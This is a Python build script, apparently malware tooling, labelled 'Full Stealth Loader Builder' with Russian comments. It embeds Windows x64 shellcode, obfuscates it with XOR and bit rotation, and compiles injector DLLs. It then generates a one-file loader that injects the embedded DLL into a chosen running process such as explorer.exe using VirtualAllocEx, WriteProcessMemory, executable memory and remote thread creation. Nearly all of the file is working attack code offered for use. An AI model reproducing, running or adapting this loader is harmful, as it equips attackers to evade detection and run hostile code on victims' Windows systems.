import os
import subprocess
import zlib
import sys
import hashlib

# ====================== ОСНОВНОЙ КЛЮЧ ======================
MASTER_KEY = b"\xAA\xBB\xCC\xDD\xEE\xFF\x11\x22\x33\x44\x55\x66\x77\x88\x99\x00"  # 16 байт
# =========================================================

shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x63\x6d\x64\x2e\x65\x78\x65\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\x48\x31\xc9\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"

def run_command(cmd):
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Error: {result.stderr.strip()}")
        return False
    return True

def quick_hash(key_bytes):
    h = hashlib.sha256(key_bytes).digest()
    return h

def derive_xor_and_rot(key_bytes):
    h = quick_hash(key_bytes)
    
    # A = XOR key = первый + последний байт хэша
    xor_key = (h[0] + h[-1]) & 0xFF
    
    # B = ROT = сумма всех байт хэша по модулю 7 (чтобы было 1-7)
    rot = sum(h) % 7 + 1
    
    return xor_key, rot

def main():
    xor_key, rot = derive_xor_and_rot(MASTER_KEY)
    print("================================================")
    print("     Full Stealth Loader Builder")
    print("================================================")
    print(f"[+] MASTER_KEY (hex): {MASTER_KEY.hex()}")
    print(f"[+] Derived XOR_KEY : 0x{xor_key:02X}")
    print(f"[+] Derived ROT     : {rot}")

    # 1. Генерация encrypt_shellcode.py
    print("[+] Generating shellcode encryptor...")

    encrypt_code = f'''import sys

xor_key = {xor_key}
rot = {rot}

shellcode = {repr(shellcode)}

encrypted = bytearray()
for b in shellcode:
    b = (b ^ xor_key) & 0xFF
    b = ((b << rot) & 0xFF) | (b >> (8 - rot))
    encrypted.append(b)

print("// Encrypted shellcode (XOR = 0x{{:02X}}, ROT = {{}})".format(xor_key, rot))
print("unsigned char encrypted_payload[] = {{")
print(", ".join("0x{{:02x}}".format(b) for b in encrypted))
print("}};")
print("unsigned int payload_len = {{}};".format(len(encrypted)))
'''

    with open("encrypt_shellcode.py", "w") as f:
        f.write(encrypt_code)

    # 2. Генерация helper.c
    print("[+] Generating helper.c...")
    helper_code = f'''#include <windows.h>

__declspec(dllexport) const unsigned char* GetEncryptionKey(unsigned int* out_len) {{
    static const unsigned char key[] = {{ {", ".join("0x{:02x}".format(b) for b in MASTER_KEY)} }};
    *out_len = sizeof(key);
    return key;
}}

__declspec(dllexport) void DummyExport() {{
    volatile int x = 42;
}}
'''
    with open("helper.c", "w") as f:
        f.write(helper_code)

    # 2. Сборка
    print("[+] Generating encrypted shellcode...")
    run_command("python3 encrypt_shellcode.py > encrypted_payload.h")

    print("[+] Building helper.dll...")
    run_command('x86_64-w64-mingw32-gcc -shared -o helper.dll helper.c -Wl,--subsystem,windows -s -O2')
    run_command('strip helper.dll')

    print("[+] Converting helper.dll to C array...")
    run_command("python3 bin2c.py helper.dll > helper_data.h")

    print("[+] Building stealth_injector.dll...")
    run_command('x86_64-w64-mingw32-gcc -shared -o stealth_injector.dll stealth_injector.c -Wl,--subsystem,windows -s -O2 -fno-stack-protector')
    run_command('strip stealth_injector.dll')

    # 3. Создаём финальный one-file loader
    print("[+] Embedding DLL into stealth_loader.py...")
    with open("stealth_injector.dll", "rb") as f:
        dll_data = f.read()

    compressed = zlib.compress(dll_data, level=9)

    with open("stealth_loader.py", "w", encoding="utf-8") as f:
        f.write(f'''import ctypes
import sys
import struct
import zlib

if sys.platform != "win32":
    print("[-] This script works only on Windows")
    sys.exit(1)

kernel32 = ctypes.windll.kernel32

COMPRESSED_DLL = {repr(compressed)}

def get_dll_bytes():
    return zlib.decompress(COMPRESSED_DLL)

''')
        # Добавляем остальной код
        f.write('''class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
        ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260),
    ]

def reflective_inject(pid: int, dll_bytes: bytes):
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll

    h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not h_process:
        raise ctypes.WinError()

    try:
        dll_size = len(dll_bytes)
        remote_base = kernel32.VirtualAllocEx(h_process, None, dll_size, 0x3000, 0x04)
        if not remote_base:
            raise ctypes.WinError()

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_base, dll_bytes, dll_size, ctypes.byref(written))

        e_lfanew = struct.unpack_from("<I", dll_bytes, 0x3C)[0]
        entry_rva = struct.unpack_from("<I", dll_bytes, e_lfanew + 0x28)[0]
        entry_point = remote_base + entry_rva

        old = ctypes.c_ulong(0)
        kernel32.VirtualProtectEx(h_process, remote_base, dll_size, 0x40, ctypes.byref(old))

        h_thread = ctypes.c_void_p(0)
        status = ntdll.NtCreateThreadEx(ctypes.byref(h_thread), 0x1FFFFF, None, h_process, entry_point, remote_base, 0, 0, 0, 0, None)

        if status == 0:
            print(f"[+] Successfully injected into PID {pid}")
            kernel32.WaitForSingleObject(h_thread, 15000)
        else:
            print("[-] NtCreateThreadEx failed, using fallback...")
            kernel32.CreateRemoteThread(h_process, None, 0, entry_point, remote_base, 0, None)
    finally:
        kernel32.CloseHandle(h_process)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python stealth_loader.py <target_process>")
        print("Example: python stealth_loader.py explorer.exe")
        sys.exit(1)

    target = sys.argv[1]
    try:
        dll_bytes = get_dll_bytes()
        print(f"[+] Loaded embedded DLL: {len(dll_bytes)} bytes")

        snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

        found = False
        if kernel32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.decode('utf-8', errors='ignore').lower() == target.lower():
                    print(f"[+] Injecting into {target} (PID: {pe.th32ProcessID})")
                    reflective_inject(pe.th32ProcessID, dll_bytes)
                    found = True
                    break
                if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                    break
        if not found:
            print(f"[-] Process '{target}' not found!")
    except Exception as e:
        print(f"[-] Error: {e}")
''')

    print("\n[+] Build completed successfully!")
    print(f"[+] Final file: **stealth_loader.py**")
    print(f"[+] Usage: python stealth_loader.py explorer.exe")

if __name__ == "__main__":
    main()